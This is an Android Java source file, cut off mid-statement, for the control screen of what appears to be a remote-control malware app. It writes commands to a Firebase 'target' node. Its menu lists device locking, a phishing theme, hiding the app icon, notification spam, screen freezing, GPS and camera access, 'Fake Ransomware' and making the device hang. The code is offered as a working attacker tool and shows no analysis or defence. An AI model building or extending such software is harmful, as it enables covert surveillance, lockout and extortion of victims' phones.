package com.paragon.control;

import android.app.AlertDialog;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.Switch;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class ControlActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private GridLayout gridFitur;
    private Button btnBack;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        gridFitur = findViewById(R.id.gridFitur);
        btnBack = findViewById(R.id.btnBack);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");

        btnBack.setOnClickListener(v -> {
            finish();
        });

        setupGrid();
    }

    private void setupGrid() {
        String[] fiturNames = {
            "Flashlight", "Lock Low", "Lock Custom V2", "Tema Phising",
            "Video Overlay", "Hide Icon", "Spam Notifikasi", "Stuck Layar",
            "GPS", "Kamera", "Fake Ransomware", "Ngehang"
        };
        String[] fiturIcons = {"🔦", "🔒", "🔒", "🎨", "🎬", "👻", "📨", "🔒", "📍", "📸", "💰", "💀"};
        boolean[] isToggle = {true, true, true, false, false, true, false, false, false, false, false, true};

        gridFitur.removeAllViews();

        for (int i = 0; i < fiturNames.length; i++) {
            View card = getLayoutInflater().inflate(R.layout.card_fitur_premium, null);

            TextView icon = card.findViewById(R.id.ivIcon);
            TextView nama = card.findViewById(R.id.tvNamaFitur);
            TextView status = card.findViewById(R.id.tvStatusFitur);
            Switch sw = card.findViewById(R.id.swFitur);
            Button btnAction = card.findViewById(R.id.btnAction);

            icon.setText(fiturIcons[i]);
            nama.setText(fiturNames[i]);

            if (isToggle[i]) {
                sw.setVisibility(View.VISIBLE);
                btnAction.setVisibility(View.GONE);
                status.setVisibility(View.VISIBLE);

                status.setText("OFF");
                status.setTextColor(0xFFE56A8D);

                final int index = i;
                sw.setOnCheckedChangeListener((buttonView, isChecked) -> {
                    status.setText(isChecked ? "ON" : "OFF");
                    status.setTextColor(isChecked ? 0xFF30D158 : 0xFFE56A8D);
                    mDatabase.child("control").child(fiturNames[index].toLowerCase()).setValue(isChecked);
                    showSn
